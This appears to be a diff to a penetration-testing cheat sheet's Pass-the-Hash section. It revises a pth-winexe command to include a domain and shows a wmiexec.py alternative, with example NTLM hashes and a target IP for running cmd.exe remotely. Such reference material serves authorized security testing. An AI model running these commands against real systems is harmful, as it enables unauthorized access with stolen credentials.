@@ -210,8 +210,9 @@ Pass-the-Hash
 * Requires Windows File and Print Sharing feature to be enabled.
 ```
 # Method 1
-$ pth-winexe -U [username]%[blank_hash]:[ntlm_hash] //[target] [command_to_exec]
-$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf6 //10.1.1.1 cmd.exe
+$ pth-winexe -U [domain]/[username]%[blank_hash]:[ntlm_hash] //[target] [command_to_exec]
+$ pth-winexe -U xor/Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf6 //10.1.1.1 cmd.exe
+^OR try without domain
 
 # Method 2
 $ python wmiexec.py Administrator@[target] -hashes [LM]:[NT/NTLM]
